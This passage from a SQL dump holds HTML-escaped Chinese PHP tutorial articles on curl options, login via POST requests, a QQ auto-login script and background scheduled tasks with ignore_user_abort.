style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_WRITEHEADER: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;这个文件写有你输出的头部分。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\nCURLOPT_STDERR: &lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;这个文件写有错误而不是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;stderr&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;以上是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;curl_opt&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;相关的资料说明&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;三、实例说明&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;一、伪造登录&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;apple-converted-space&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;主站&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;wap&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;登录和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;discuz&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;论坛&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;wap&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;登录，两边的用户数据资料在同一个表中进行调用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;//&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;论坛&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;api&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;登录接口地址&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $uri =&quot;http//www.wap.com/ssdfasdfsf&quot;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; //&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;参数数组&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $data =array(&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;''username''&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;gt; ''username'',&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;''password''&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;gt; ''password'',&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; );&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;//&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;操作执行&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $ch =curl_init();&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;curl_setopt($ch, CURLOPT_URL, $uri);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;curl_setopt($ch, CURLOPT_POST, 1);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;curl_setopt($ch, CURLOPT_HEADER,1);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;curl_setopt($ch, CURLOPT_POSTFIELDS, $data);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; curl_exec($ch);&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;统一两天的&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;sessionid&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;产生机制，改造论坛&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;wap&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;用户验证方法。&lt;/span&gt;&lt;/strong&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;二、用&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;php&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;实现&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;qq&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;挂机的程序&lt;/span&gt;&lt;/strong&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;现时&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;QQ&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;挂机十分流行，给一个原理大家可以拿来研究&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:arial;&quot;&gt;&lt;font class=&quot;Apple-style-span&quot; color=&quot;#636B75&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size:14px;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size:10.5pt;&quot;&gt;PHP&lt;/span&gt;&lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;代码&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;:&lt;br /&gt;\r\n&lt;php &lt;br&gt;$qq = &quot;100000&quot;; //qq&lt;/php &lt;br&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;号码&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n$pwd = &quot;123456&quot;; //&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;密码&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\n$ch = curl_init();&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_URL, &quot;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;&quot;&gt;url&lt;font class=&quot;Apple-style-span&quot; color=&quot;#636B75&quot;&gt;&quot;);&lt;/font&gt;&lt;br /&gt;\r\n&lt;font class=&quot;Apple-style-span&quot; color=&quot;#636B75&quot;&gt;curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); //&lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;这行是设定&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;是否跟随&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;header&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;发送的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;location,&lt;span class=&quot;apple-converted-space&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;重要&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_POST, 1);&lt;br /&gt;\r\n//curl_setopt($ch, &quot;Connection&quot;, &quot;Keep-Alive&quot;);&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER,1);&lt;br /&gt;\r\ncurl_setopt($ch, CURLOPT_POSTFIELDS,&quot;qq=&quot;.$qq.&quot;&amp;amp;pwd=&quot;.$pwd.&quot;&amp;amp;FromWhere=register&quot;);&lt;br /&gt;\r\n$return = curl_exec($ch);&lt;span class=&quot;apple-converted-space&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;br /&gt;\r\ncurl_close($ch);&lt;br /&gt;\r\necho strstr($return, &quot;postfield&quot;) ? &quot;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;登录失败&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&quot; : &quot;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;登录成功&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;&quot;;&lt;br /&gt;\r\n?&amp;gt;&lt;span class=&quot;apple-converted-space&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;注：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;、需&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;模块支持&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt;,2&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;、登陆后，你的好友将会看到你在线&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.5pt;font-family:arial;color:#636b75;&quot;&gt; 3&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;color:#636b75;&quot;&gt;、不知道如何下线。&lt;/span&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1302789038, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(57, 1, 'PHP5计划任务离线功能的原理-php技术', '', '', '&lt;p class=&quot;MsoNormal&quot; style=&quot;line-height:18.75pt;background:#eff4fa;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;&quot;&gt;为了定时更新某一文件，需要程序自动运行，从网上搜到了两种方法：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;&quot;&gt;ignore_user_abort() &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;&quot;&gt;和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;&quot;&gt;crontab ignore_user_abort()&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;&quot;&gt;函数搭配&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;&quot;&gt;set_time_limit(0)&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;&quot;&gt;和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;&quot;&gt;sleep($interval)&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;&quot;&gt;即可实现程序自动运行更新，下面是一个实例&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;&quot;&gt; ?php ignore_user_abort(); //&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;&quot;&gt;即使&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;&quot;&gt;Client&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;&quot;&gt;断开&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;为了定时更新某一文件，需要程序自动运行，从网上搜到了两种方法：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;ignore_user_abort()&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;crontab&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;ignore_user_abort()&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;函数搭配&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;set_time_limit(0)&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;sleep($interval)&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;即可实现程序自动运行更新，下面是一个实例&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;lt;?php&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;ignore_user_abort();//&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;即使&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;Client&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;断开&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;如关掉浏览器&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 